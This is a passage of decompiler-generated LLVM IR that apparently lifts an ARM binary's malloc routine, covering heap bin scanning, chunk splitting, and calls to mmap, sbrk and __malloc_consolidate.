  br label %dec_label_pc_12aec.preheader

dec_label_pc_12ab0.preheader:                     ; preds = %bb143, %.thread13
  %v0_12ab0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_12ab0

dec_label_pc_12ab0:                               ; preds = %dec_label_pc_12ab0.preheader, %dec_label_pc_12abc
  %v0_12ab0 = phi i32 [ %v0_12ab0.pre, %dec_label_pc_12ab0.preheader ], [ %v1_12ab0, %dec_label_pc_12abc ]
  %v1_12ab0 = add i32 %v0_12ab0, 1
  store i32 %v1_12ab0, i32* @r5, align 4
  %tmp209 = icmp ugt i32 %v1_12ab0, 2
  br i1 %tmp209, label %dec_label_pc_12b90.loopexit, label %dec_label_pc_12abc

dec_label_pc_12abc:                               ; preds = %dec_label_pc_12ab0
  store i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32* %r3.global-to-local, align 4
  %v1_12ac0 = load i32, i32* @r8, align 4
  %v2_12ac0 = add i32 %v1_12ac0, sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32)
  %v3_12ac0 = inttoptr i32 %v2_12ac0 to i32*
  %v4_12ac0 = load i32, i32* %v3_12ac0, align 4
  store i32 %v4_12ac0, i32* %r2.global-to-local, align 4
  %v4_12ac4 = mul i32 %v1_12ab0, 4
  %v5_12ac4 = add i32 %v4_12ac0, %v4_12ac4
  store i32 %v5_12ac4, i32* %r3.global-to-local, align 4
  %v1_12ac8 = add i32 %v5_12ac4, 820
  %v2_12ac8 = inttoptr i32 %v1_12ac8 to i32*
  %v3_12ac8 = load i32, i32* %v2_12ac8, align 4
  store i32 %v3_12ac8, i32* @r4, align 4
  %v2_12acc = icmp eq i32 %v3_12ac8, 0
  br i1 %v2_12acc, label %dec_label_pc_12ab0, label %dec_label_pc_12ad4

dec_label_pc_12ad4:                               ; preds = %dec_label_pc_12abc
  %v4_12ad4 = mul i32 %v1_12ab0, 256
  %v5_12ad4 = add i32 %v4_12ac0, %v4_12ad4
  store i32 %v5_12ad4, i32* %r3.global-to-local, align 4
  %v1_12ad8 = add i32 %v5_12ad4, 44
  store i32 %v1_12ad8, i32* %r0.global-to-local, align 4
  %v0_12adc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_12adc, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12aec.preheader

dec_label_pc_12aec.preheader:                     ; preds = %.dec_label_pc_12aec.preheader_crit_edge, %dec_label_pc_12ad4
  %v0_12ae455 = phi i32 [ %v1_12ad8, %dec_label_pc_12ad4 ], [ %v0_12ae455.pre, %.dec_label_pc_12aec.preheader_crit_edge ]
  %v0_12b08 = phi i32 [ %v3_12ac8, %dec_label_pc_12ad4 ], [ %v1_12aa0, %.dec_label_pc_12aec.preheader_crit_edge ]
  %ip.promoted = phi i32 [ %v0_12adc, %dec_label_pc_12ad4 ], [ %v0_12aa0, %.dec_label_pc_12aec.preheader_crit_edge ]
  %v2_12aec52 = and i32 %ip.promoted, %v0_12b08
  %v4_12aec54 = icmp eq i32 %v2_12aec52, 0
  br i1 %v4_12aec54, label %dec_label_pc_12ae4, label %dec_label_pc_12af4

dec_label_pc_12ae4:                               ; preds = %dec_label_pc_12aec.preheader, %dec_label_pc_12ae4
  %v2_12ae857 = phi i32 [ %v2_12ae8, %dec_label_pc_12ae4 ], [ %ip.promoted, %dec_label_pc_12aec.preheader ]
  %v0_12ae456 = phi i32 [ %v1_12ae4, %dec_label_pc_12ae4 ], [ %v0_12ae455, %dec_label_pc_12aec.preheader ]
  %v1_12ae4 = add i32 %v0_12ae456, 8
  %v2_12ae8 = mul i32 %v2_12ae857, 2
  %v2_12aec = and i32 %v2_12ae8, %v0_12b08
  %v4_12aec = icmp eq i32 %v2_12aec, 0
  br i1 %v4_12aec, label %dec_label_pc_12ae4, label %dec_label_pc_12aec.dec_label_pc_12af4_crit_edge

dec_label_pc_12aec.dec_label_pc_12af4_crit_edge:  ; preds = %dec_label_pc_12ae4
  store i32 %v1_12ae4, i32* %r0.global-to-local, align 4
  store i32 %v2_12ae8, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12af4

dec_label_pc_12af4:                               ; preds = %dec_label_pc_12aec.dec_label_pc_12af4_crit_edge, %dec_label_pc_12aec.preheader
  %v0_12b14 = phi i32 [ %v2_12ae8, %dec_label_pc_12aec.dec_label_pc_12af4_crit_edge ], [ %ip.promoted, %dec_label_pc_12aec.preheader ]
  %v0_12b38 = phi i32 [ %v1_12ae4, %dec_label_pc_12aec.dec_label_pc_12af4_crit_edge ], [ %v0_12ae455, %dec_label_pc_12aec.preheader ]
  %v1_12af4 = add i32 %v0_12b38, 12
  %v2_12af4 = inttoptr i32 %v1_12af4 to i32*
  %v3_12af4 = load i32, i32* %v2_12af4, align 4
  store i32 %v3_12af4, i32* @lr, align 4
  %v9_12af8 = icmp eq i32 %v3_12af4, %v0_12b38
  br i1 %v9_12af8, label %dec_label_pc_12b00, label %dec_label_pc_12b20

dec_label_pc_12b00:                               ; preds = %dec_label_pc_12af4
  store i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32* %r0.global-to-local, align 4
  %v1_12b04 = load i32, i32* @r8, align 4
  %v2_12b04 = add i32 %v1_12b04, sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32)
  %v3_12b04 = inttoptr i32 %v2_12b04 to i32*
  %v4_12b04 = load i32, i32* %v3_12b04, align 4
  %v2_12b08 = sub i32 -1, %v0_12b14
  %v3_12b08 = and i32 %v0_12b08, %v2_12b08
  store i32 %v3_12b08, i32* @r4, align 4
  %v1_12b0c = load i32, i32* @r5, align 4
  %v4_12b0c = mul i32 %v1_12b0c, 4
  %v5_12b0c = add i32 %v4_12b0c, %v4_12b04
  store i32 %v5_12b0c, i32* %r3.global-to-local, align 4
  %v1_12b10 = add i32 %v0_12b38, 8
  store i32 %v1_12b10, i32* %r0.global-to-local, align 4
  %v2_12b14 = mul i32 %v0_12b14, 2
  store i32 %v2_12b14, i32* %ip.global-to-local, align 4
  %v2_12b18 = add i32 %v5_12b0c, 820
  %v3_12b18 = inttoptr i32 %v2_12b18 to i32*
  store i32 %v3_12b08, i32* %v3_12b18, align 4
  %v0_12a98.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_12aa0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12a98

dec_label_pc_12b20:                               ; preds = %dec_label_pc_12af4
  %v1_12b20 = add i32 %v3_12af4, 4
  %v2_12b20 = inttoptr i32 %v1_12b20 to i32*
  %v3_12b20 = load i32, i32* %v2_12b20, align 4
  store i32 %v3_12b20, i32* %r3.global-to-local, align 4
  %v1_12b24 = and i32 %v3_12b20, -4
  store i32 %v1_12b24, i32* %r2.global-to-local, align 4
  %v0_12b28 = load i32, i32* @sl, align 4
  %v2_12b28 = sub i32 %v1_12b24, %v0_12b28
  store i32 %v2_12b28, i32* %ip.global-to-local, align 4
  %v1_12b2c = add i32 %v3_12af4, 12
  %v2_12b2c = inttoptr i32 %v1_12b2c to i32*
  %v3_12b2c = load i32, i32* %v2_12b2c, align 4
  store i32 %v3_12b2c, i32* %r3.global-to-local, align 4
  %tmp210 = icmp ult i32 %v2_12b28, 16
  br i1 %tmp210, label %bb144, label %bb145

bb144:                                            ; preds = %dec_label_pc_12b20
  %v6_12b34 = add i32 %v1_12b24, %v3_12af4
  store i32 %v6_12b34, i32* %r2.global-to-local, align 4
  br label %bb145

bb145:                                            ; preds = %dec_label_pc_12b20, %bb144
  %v2_12b38 = add i32 %v3_12b2c, 8
  %v3_12b38 = inttoptr i32 %v2_12b38 to i32*
  store i32 %v0_12b38, i32* %v3_12b38, align 4
  %v0_12b3c = load i32, i32* %r3.global-to-local, align 4
  %v1_12b3c = load i32, i32* %r0.global-to-local, align 4
  %v2_12b3c = add i32 %v1_12b3c, 12
  %v3_12b3c = inttoptr i32 %v2_12b3c to i32*
  store i32 %v0_12b3c, i32* %v3_12b3c, align 4
  %v4_12b40 = load i32, i32* @lr, align 4
  br i1 %tmp210, label %.dec_label_pc_12a1c_crit_edge, label %dec_label_pc_12b4c

.dec_label_pc_12a1c_crit_edge:                    ; preds = %bb145
  %v5_12b40 = add i32 %v4_12b40, 8
  store i32 %v5_12b40, i32* %r4.global-to-local, align 4
  %v4_12b44 = load i32, i32* %r2.global-to-local, align 4
  %v5_12b44 = add i32 %v4_12b44, 4
  %v6_12b44 = inttoptr i32 %v5_12b44 to i32*
  %v7_12b44 = load i32, i32* %v6_12b44, align 4
  store i32 %v7_12b44, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_12a1c

dec_label_pc_12b4c:                               ; preds = %bb145
  %v1_12b4c = load i32, i32* @sl, align 4
  %v2_12b4c = add i32 %v1_12b4c, %v4_12b40
  store i32 %v2_12b4c, i32* %r1.global-to-local, align 4
  %v1_12b54 = load i32, i32* @r6, align 4
  %v2_12b54 = add i32 %v1_12b54, 8
  %v3_12b54 = inttoptr i32 %v2_12b54 to i32*
  store i32 %v2_12b4c, i32* %v3_12b54, align 4
  %v0_12b58 = load i32, i32* %r1.global-to-local, align 4
  %v1_12b58 = load i32, i32* @r6, align 4
  %v2_12b58 = add i32 %v1_12b58, 12
  %v3_12b58 = inttoptr i32 %v2_12b58 to i32*
  store i32 %v0_12b58, i32* %v3_12b58, align 4
  %v0_12b5c = load i32, i32* @r6, align 4
  %v1_12b5c = load i32, i32* %r1.global-to-local, align 4
  %v2_12b5c = add i32 %v1_12b5c, 8
  %v3_12b5c = inttoptr i32 %v2_12b5c to i32*
  store i32 %v0_12b5c, i32* %v3_12b5c, align 4
  %v0_12b60 = load i32, i32* @r6, align 4
  %v1_12b60 = load i32, i32* %r1.global-to-local, align 4
  %v2_12b60 = add i32 %v1_12b60, 12
  %v3_12b60 = inttoptr i32 %v2_12b60 to i32*
  store i32 %v0_12b60, i32* %v3_12b60, align 4
  %tmp211 = icmp ult i32 %v1_12b4c, 256
  br i1 %tmp211, label %bb146, label %.thread122

bb146:                                            ; preds = %dec_label_pc_12b4c
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32* %r2.global-to-local, align 4
  %v8_12b6c = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32 32) to i32*), align 4
  store i32 %v8_12b6c, i32* %r3.global-to-local, align 4
  %v4_12b70 = load i32, i32* %r1.global-to-local, align 4
  %v6_12b70 = add i32 %v8_12b6c, 48
  %v7_12b70 = inttoptr i32 %v6_12b70 to i32*
  store i32 %v4_12b70, i32* %v7_12b70, align 4
  br label %.thread122

.thread122:                                       ; preds = %dec_label_pc_12b4c, %bb146
  %v0_12b74 = load i32, i32* @sl, align 4
  %v1_12b74 = or i32 %v0_12b74, 1
  store i32 %v1_12b74, i32* %r2.global-to-local, align 4
  %v0_12b78 = load i32, i32* %ip.global-to-local, align 4
  %v1_12b78 = or i32 %v0_12b78, 1
  store i32 %v1_12b78, i32* %r3.global-to-local, align 4
  %v0_12b7c = load i32, i32* @lr, align 4
  %v1_12b7c = add i32 %v0_12b7c, 8
  store i32 %v1_12b7c, i32* %r4.global-to-local, align 4
  %v2_12b80 = add i32 %v0_12b7c, 4
  %v3_12b80 = inttoptr i32 %v2_12b80 to i32*
  store i32 %v1_12b74, i32* %v3_12b80, align 4
  %v0_12b84 = load i32, i32* %ip.global-to-local, align 4
  %v1_12b84 = load i32, i32* %r1.global-to-local, align 4
  %v3_12b84 = add i32 %v1_12b84, %v0_12b84
  %v4_12b84 = inttoptr i32 %v3_12b84 to i32*
  store i32 %v0_12b84, i32* %v4_12b84, align 4
  %v0_12b88 = load i32, i32* %r3.global-to-local, align 4
  %v1_12b88 = load i32, i32* %r1.global-to-local, align 4
  %v2_12b88 = add i32 %v1_12b88, 4
  %v3_12b88 = inttoptr i32 %v2_12b88 to i32*
  store i32 %v0_12b88, i32* %v3_12b88, align 4
  br label %dec_label_pc_12fdc

dec_label_pc_12b90.loopexit:                      ; preds = %dec_label_pc_12ab0
  br label %dec_label_pc_12b90

dec_label_pc_12b90:                               ; preds = %dec_label_pc_12b90.loopexit, %dec_label_pc_127a4, %dec_label_pc_127ac
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32* %ip.global-to-local, align 4
  %v4_12b98 = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32 32) to i32*), align 4
  store i32 %v4_12b98, i32* @r0, align 4
  %v1_12b9c = add i32 %v4_12b98, 44
  %v2_12b9c = inttoptr i32 %v1_12b9c to i32*
  %v3_12b9c = load i32, i32* %v2_12b9c, align 4
  store i32 %v3_12b9c, i32* %ip.global-to-local, align 4
  %v1_12ba0 = add i32 %v3_12b9c, 4
  %v2_12ba0 = inttoptr i32 %v1_12ba0 to i32*
  %v3_12ba0 = load i32, i32* %v2_12ba0, align 4
  %v0_12ba4 = load i32, i32* @sl, align 4
  %v1_12ba4 = add i32 %v0_12ba4, 16
  store i32 %v1_12ba4, i32* %r1.global-to-local, align 4
  %v1_12ba8 = and i32 %v3_12ba0, -4
  store i32 %v1_12ba8, i32* %r3.global-to-local, align 4
  %v3_12bac = icmp ult i32 %v1_12ba8, %v1_12ba4
  br i1 %v3_12bac, label %dec_label_pc_12bdc, label %dec_label_pc_12bb8

dec_label_pc_12bb8:                               ; preds = %dec_label_pc_12b90
  %v2_12bb8 = sub i32 %v1_12ba8, %v0_12ba4
  %v2_12bbc = add i32 %v0_12ba4, %v3_12b9c
  store i32 %v2_12bbc, i32* %r1.global-to-local, align 4
  %v1_12bc0 = or i32 %v2_12bb8, 1
  store i32 %v1_12bc0, i32* %r3.global-to-local, align 4
  %v1_12bc4 = or i32 %v0_12ba4, 1
  store i32 %v1_12bc4, i32* %r2.global-to-local, align 4
  %v1_12bc8 = add i32 %v3_12b9c, 8
  store i32 %v1_12bc8, i32* %r4.global-to-local, align 4
  store i32 %v1_12bc4, i32* %v2_12ba0, align 4
  %v0_12bd0 = load i32, i32* %r1.global-to-local, align 4
  %v1_12bd0 = load i32, i32* @r0, align 4
  %v2_12bd0 = add i32 %v1_12bd0, 44
  %v3_12bd0 = inttoptr i32 %v2_12bd0 to i32*
  store i32 %v0_12bd0, i32* %v3_12bd0, align 4
  %v0_12bd4 = load i32, i32* %r3.global-to-local, align 4
  %v1_12bd4 = load i32, i32* %r1.global-to-local, align 4
  %v2_12bd4 = add i32 %v1_12bd4, 4
  %v3_12bd4 = inttoptr i32 %v2_12bd4 to i32*
  store i32 %v0_12bd4, i32* %v3_12bd4, align 4
  br label %dec_label_pc_12fdc

dec_label_pc_12bdc:                               ; preds = %dec_label_pc_12b90
  %v1_12bdc = inttoptr i32 %v4_12b98 to i32*
  %v2_12bdc = load i32, i32* %v1_12bdc, align 4
  store i32 %v2_12bdc, i32* %r3.global-to-local, align 4
  %v1_12be0 = and i32 %v2_12bdc, 2
  store i32 %v1_12be0, i32* %ip.global-to-local, align 4
  %v2_12be0 = icmp eq i32 %v1_12be0, 0
  %v1_12be4 = add i32 %v4_12b98, 860
  %v2_12be4 = inttoptr i32 %v1_12be4 to i32*
  %v3_12be4 = load i32, i32* %v2_12be4, align 4
  store i32 %v3_12be4, i32* %r1.global-to-local, align 4
  br i1 %v2_12be0, label %dec_label_pc_12bfc, label %dec_label_pc_12bec

dec_label_pc_12bec:                               ; preds = %dec_label_pc_12bdc
  %v0_12bec = call i32 @__malloc_consolidate()
  %v0_12bf0 = load i32, i32* @sl, align 4
  %v1_12bf0 = add i32 %v0_12bf0, -7
  store i32 %v1_12bf0, i32* %r0.global-to-local, align 4
  %v1_12bf4 = call i32 @malloc(i32 %v1_12bf0)
  store i32 %v1_12bf4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12fd8

dec_label_pc_12bfc:                               ; preds = %dec_label_pc_12bdc
  %v1_12bfc = add i32 %v4_12b98, 844
  %v2_12bfc = inttoptr i32 %v1_12bfc to i32*
  %v3_12bfc = load i32, i32* %v2_12bfc, align 4
  store i32 %v3_12bfc, i32* %r3.global-to-local, align 4
  %v3_12c00 = icmp ult i32 %v0_12ba4, %v3_12bfc
  %v1_12c04 = add i32 %v3_12be4, -1
  store i32 %v1_12c04, i32* %sb.global-to-local, align 4
  br i1 %v3_12c00, label %dec_label_pc_12cd8, label %dec_label_pc_12c0c

dec_label_pc_12c0c:                               ; preds = %dec_label_pc_12bfc
  %v1_12c0c = add i32 %v4_12b98, 852
  %v2_12c0c = inttoptr i32 %v1_12c0c to i32*
  %v3_12c0c = load i32, i32* %v2_12c0c, align 4
  store i32 %v3_12c0c, i32* %r2.global-to-local, align 4
  %v1_12c10 = add i32 %v4_12b98, 848
  %v2_12c10 = inttoptr i32 %v1_12c10 to i32*
  %v3_12c10 = load i32, i32* %v2_12c10, align 4
  store i32 %v3_12c10, i32* %r3.global-to-local, align 4
  %v6_12c18 = icmp slt i32 %v3_12c10, %v3_12c0c
  br i1 %v6_12c18, label %dec_label_pc_12c1c, label %dec_label_pc_12cd8

dec_label_pc_12c1c:                               ; preds = %dec_label_pc_12c0c
  %v1_12c1c = add i32 %v0_12ba4, 10
  %v2_12c20 = add i32 %v1_12c1c, %v3_12be4
  store i32 %v2_12c20, i32* %r3.global-to-local, align 4
  %v2_12c24 = sub i32 0, %v3_12be4
  %v3_12c24 = and i32 %v2_12c20, %v2_12c24
  store i32 %v3_12c24, i32* @r4, align 4
  %tmp212 = icmp ugt i32 %v3_12c24, %v0_12ba4
  br i1 %tmp212, label %dec_label_pc_12c30, label %dec_label_pc_12cd8

dec_label_pc_12c30:                               ; preds = %dec_label_pc_12c1c
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_12c24, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_12c48 = call i32 @mmap(i32 0, i32 %v3_12c24, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_12c48, i32* %r0.global-to-local, align 4
  %v7_12c4c = icmp eq i32 %v6_12c48, -1
  br i1 %v7_12c4c, label %dec_label_pc_12c30.dec_label_pc_12cd8_crit_edge, label %dec_label_pc_12c54

dec_label_pc_12c30.dec_label_pc_12cd8_crit_edge:  ; preds = %dec_label_pc_12c30
  %v1_12cfc.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_12cd8

dec_label_pc_12c54:                               ; preds = %dec_label_pc_12c30
  %v1_12c54 = urem i32 %v6_12c48, 8
  store i32 %v1_12c54, i32* %r2.global-to-local, align 4
  %v2_12c54 = icmp eq i32 %v1_12c54, 0
  br i1 %v2_12c54, label %bb147, label %.thread26

.thread26:                                        ; preds = %dec_label_pc_12c54
  %v2_12c58 = sub nsw i32 8, %v1_12c54
  store i32 %v2_12c58, i32* %r3.global-to-local, align 4
  %v2_12c5c = load i32, i32* @r4, align 4
  %v3_12c5c = sub i32 %v2_12c5c, %v2_12c58
  %v3_12c60 = add i32 %v2_12c58, %v6_12c48
  store i32 %v3_12c60, i32* %lr.global-to-local, align 4
  %v2_12c68 = or i32 %v3_12c5c, 2
  store i32 %v2_12c68, i32* %r2.global-to-local, align 4
  %v5_12c70 = inttoptr i32 %v3_12c60 to i32*
  store i32 %v2_12c58, i32* %v5_12c70, align 4
  %v1_12c74 = load i32, i32* %r2.global-to-local, align 4
  %v2_12c74 = load i32, i32* %lr.global-to-local, align 4
  %v3_12c74 = add i32 %v2_12c74, 4
  %v4_12c74 = inttoptr i32 %v3_12c74 to i32*
  store i32 %v1_12c74, i32* %v4_12c74, align 4
  br label %.thread28

bb147:                                            ; preds = %dec_label_pc_12c54
  store i32 %v6_12c48, i32* %lr.global-to-local, align 4
  %v1_12c6c48 = load i32, i32* @r4, align 4
  %v2_12c6c49 = or i32 %v1_12c6c48, 2
  store i32 %v2_12c6c49, i32* %r3.global-to-local, align 4
  %v3_12c78 = inttoptr i32 %v6_12c48 to i32*
  store i32 0, i32* %v3_12c78, align 4
  %v1_12c7c = load i32, i32* %r3.global-to-local, align 4
  %v2_12c7c = load i32, i32* %lr.global-to-local, align 4
  %v3_12c7c = add i32 %v2_12c7c, 4
  %v4_12c7c = inttoptr i32 %v3_12c7c to i32*
  store i32 %v1_12c7c, i32* %v4_12c7c, align 4
  br label %.thread28

.thread28:                                        ; preds = %.thread26, %bb147
  store i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32* %r2.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_12c88 = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32 32) to i32*), align 4
  store i32 %v4_12c88, i32* %ip.global-to-local, align 4
  %v1_12c8c = add i32 %v4_12c88, 848
  %v2_12c8c = inttoptr i32 %v1_12c8c to i32*
  %v3_12c8c = load i32, i32* %v2_12c8c, align 4
  store i32 %v3_12c8c, i32* %r3.global-to-local, align 4
  %v1_12c90 = add i32 %v4_12c88, 856
  %v2_12c90 = inttoptr i32 %v1_12c90 to i32*
  %v3_12c90 = load i32, i32* %v2_12c90, align 4
  store i32 %v3_12c90, i32* %r2.global-to-local, align 4
  %v1_12c94 = add i32 %v3_12c8c, 1
  store i32 %v1_12c94, i32* %r3.global-to-local, align 4
  %v7_12c9c = icmp sgt i32 %v1_12c94, %v3_12c90
  br i1 %v7_12c9c, label %bb148, label %bb149

bb148:                                            ; preds = %.thread28
  store i32 %v1_12c94, i32* %v2_12c90, align 4
  %v0_12ca0.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_12ca0.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb149

bb149:                                            ; preds = %.thread28, %bb148
  %v1_12ca0 = phi i32 [ %v4_12c88, %.thread28 ], [ %v1_12ca0.pre, %bb148 ]
  %v0_12ca0 = phi i32 [ %v1_12c94, %.thread28 ], [ %v0_12ca0.pre, %bb148 ]
  %v2_12ca0 = add i32 %v1_12ca0, 848
  %v3_12ca0 = inttoptr i32 %v2_12ca0 to i32*
  store i32 %v0_12ca0, i32* %v3_12ca0, align 4
  %v0_12ca4 = load i32, i32* %ip.global-to-local, align 4
  %v1_12ca4 = add i32 %v0_12ca4, 868
  %v2_12ca4 = inttoptr i32 %v1_12ca4 to i32*
  %v3_12ca4 = load i32, i32* %v2_12ca4, align 4
  store i32 %v3_12ca4, i32* %r3.global-to-local, align 4
  %v1_12ca8 = add i32 %v0_12ca4, 880
  %v2_12ca8 = inttoptr i32 %v1_12ca8 to i32*
  %v3_12ca8 = load i32, i32* %v2_12ca8, align 4
  store i32 %v3_12ca8, i32* %r2.global-to-local, align 4
  %v0_12cac = load i32, i32* @r4, align 4
  %v2_12cac = add i32 %v0_12cac, %v3_12ca4
  store i32 %v2_12cac, i32* %r1.global-to-local, align 4
  %v1_12cb0 = add i32 %v0_12ca4, 872
  %v2_12cb0 = inttoptr i32 %v1_12cb0 to i32*
  %v3_12cb0 = load i32, i32* %v2_12cb0, align 4
  store i32 %v3_12cb0, i32* %r3.global-to-local, align 4
  %v1_12cb8 = add i32 %v0_12ca4, 884
  %v2_12cb8 = inttoptr i32 %v1_12cb8 to i32*
  %v3_12cb8 = load i32, i32* %v2_12cb8, align 4
  store i32 %v3_12cb8, i32* %r2.global-to-local, align 4
  %tmp213 = icmp ugt i32 %v2_12cac, %v3_12ca8
  br i1 %tmp213, label %bb150, label %bb151

bb150:                                            ; preds = %bb149
  store i32 %v2_12cac, i32* %v2_12ca8, align 4
  %v0_12cc0.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_12cc0.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb151

bb151:                                            ; preds = %bb149, %bb150
  %v1_12cc0 = phi i32 [ %v0_12ca4, %bb149 ], [ %v1_12cc0.pre, %bb150 ]
  %v0_12cc0 = phi i32 [ %v2_12cac, %bb149 ], [ %v0_12cc0.pre, %bb150 ]
  %v2_12cc0 = add i32 %v1_12cc0, 868
  %v3_12cc0 = inttoptr i32 %v2_12cc0 to i32*
  store i32 %v0_12cc0, i32* %v3_12cc0, align 4
  %v0_12cc4 = load i32, i32* %r1.global-to-local, align 4
  %v1_12cc4 = load i32, i32* %r3.global-to-local, align 4
  %v2_12cc4 = add i32 %v1_12cc4, %v0_12cc4
  store i32 %v2_12cc4, i32* %r1.global-to-local, align 4
  %v1_12cc8 = load i32, i32* %r2.global-to-local, align 4
  %v0_12ccc = load i32, i32* %lr.global-to-local, align 4
  %v1_12ccc = add i32 %v0_12ccc, 8
  store i32 %v1_12ccc, i32* %r0.global-to-local, align 4
  %tmp214 = icmp ugt i32 %v2_12cc4, %v1_12cc8
  br i1 %tmp214, label %bb152, label %dec_label_pc_12fd8

bb152:                                            ; preds = %bb151
  %v5_12cd0 = load i32, i32* %ip.global-to-local, align 4
  %v6_12cd0 = add i32 %v5_12cd0, 884
  %v7_12cd0 = inttoptr i32 %v6_12cd0 to i32*
  store i32 %v2_12cc4, i32* %v7_12cd0, align 4
  br label %dec_label_pc_12fd8

dec_label_pc_12cd8:                               ; preds = %dec_label_pc_12c1c, %dec_label_pc_12bfc, %dec_label_pc_12c30.dec_label_pc_12cd8_crit_edge, %dec_label_pc_12c0c
  %v1_12cfc = phi i32 [ %v1_12cfc.pre, %dec_label_pc_12c30.dec_label_pc_12cd8_crit_edge ], [ %v0_12ba4, %dec_label_pc_12c0c ], [ %v0_12ba4, %dec_label_pc_12bfc ], [ %v0_12ba4, %dec_label_pc_12c1c ]
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32* %ip.global-to-local, align 4
  %v4_12ce0 = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32 32) to i32*), align 4
  store i32 %v4_12ce0, i32* %r3.global-to-local, align 4
  %v1_12ce4 = add i32 %v4_12ce0, 44
  %v2_12ce4 = inttoptr i32 %v1_12ce4 to i32*
  %v3_12ce4 = load i32, i32* %v2_12ce4, align 4
  store i32 %v3_12ce4, i32* %r0.global-to-local, align 4
  %v1_12ce8 = add i32 %v4_12ce0, 864
  %v2_12ce8 = inttoptr i32 %v1_12ce8 to i32*
  %v3_12ce8 = load i32, i32* %v2_12ce8, align 4
  store i32 %v3_12ce8, i32* %r2.global-to-local, align 4
  %v1_12cec = add i32 %v4_12ce0, 840
  %v2_12cec = inttoptr i32 %v1_12cec to i32*
  %v3_12cec = load i32, i32* %v2_12cec, align 4
  store i32 %v3_12cec, i32* %r3.global-to-local, align 4
  %v1_12cf0 = add i32 %v3_12ce4, 4
  %v2_12cf0 = inttoptr i32 %v1_12cf0 to i32*
  %v3_12cf0 = load i32, i32* %v2_12cf0, align 4
  store i32 %v3_12cf0, i32* %r1.global-to-local, align 4
  %v1_12cf8 = urem i32 %v3_12ce8, 2
  %v2_12cf8 = icmp eq i32 %v1_12cf8, 0
  %v1_12cf4 = add i32 %v1_12cfc, 16
  %v2_12cfc = add i32 %v1_12cf4, %v3_12cec
  store i32 %v2_12cfc, i32* %r3.global-to-local, align 4
  %v1_12d00 = and i32 %v3_12cf0, -4
  store i32 %v1_12d00, i32* @r8, align 4
  br i1 %v2_12cf8, label %bb154, label %bb153

bb153:                                            ; preds = %dec_label_pc_12cd8
  %v3_12d04 = sub i32 %v2_12cfc, %v1_12d00
  store i32 %v3_12d04, i32* %r3.global-to-local, align 4
  br label %bb154

bb154:                                            ; preds = %dec_label_pc_12cd8, %bb153
  %v0_12d08 = phi i32 [ %v2_12cfc, %dec_label_pc_12cd8 ], [ %v3_12d04, %bb153 ]
  %v1_12d08 = load i32, i32* %sb.global-to-local, align 4
  %v2_12d08 = add i32 %v1_12d08, %v0_12d08
  store i32 %v2_12d08, i32* %r3.global-to-local, align 4
  %v1_12d0c = sub i32 -1, %v1_12d08
  store i32 %v1_12d0c, i32* %fp.global-to-local, align 4
  %v2_12d10 = and i32 %v2_12d08, %v1_12d0c
  store i32 %v2_12d10, i32* @r5, align 4
  %tmp155 = icmp slt i32 %v2_12d10, 1
  br i1 %tmp155, label %dec_label_pc_12d34, label %dec_label_pc_12d20

dec_label_pc_12d20:                               ; preds = %bb154
  store i32 %v2_12d10, i32* %r0.global-to-local, align 4
  %v1_12d24 = call i32 @__GI_sbrk(i32 %v2_12d10)
  store i32 %v1_12d24, i32* %r0.global-to-local, align 4
  %v3_12d28 = icmp eq i32 %v1_12d24, -1
  store i32 %v1_12d24, i32* @r4, align 4
  br i1 %v3_12d28, label %dec_label_pc_12d34, label %dec_label_pc_12da0

dec_label_pc_12d34:                               ; preds = %dec_label_pc_12d20, %bb154
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32* %r1.global-to-local, align 4
  %v4_12d3c = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32 32) to i32*), align 4
  store i32 %v4_12d3c, i32* %r6.global-to-local, align 4
  %v1_12d40 = add i32 %v4_12d3c, 864
  %v2_12d40 = inttoptr i32 %v1_12d40 to i32*
  %v3_12d40 = load i32, i32* %v2_12d40, align 4
  store i32 %v3_12d40, i32* %r3.global-to-local, align 4
  %v1_12d44 = urem i32 %v3_12d40, 2
  %v2_12d44 = icmp eq i32 %v1_12d44, 0
  br i1 %v2_12d44, label %.thread30thread-pre-split, label %bb156

bb156:                                            ; preds = %dec_label_pc_12d34
  %v1_12d48 = load i32, i32* @r8, align 4
  %v2_12d48 = load i32, i32* %sb.global-to-local, align 4
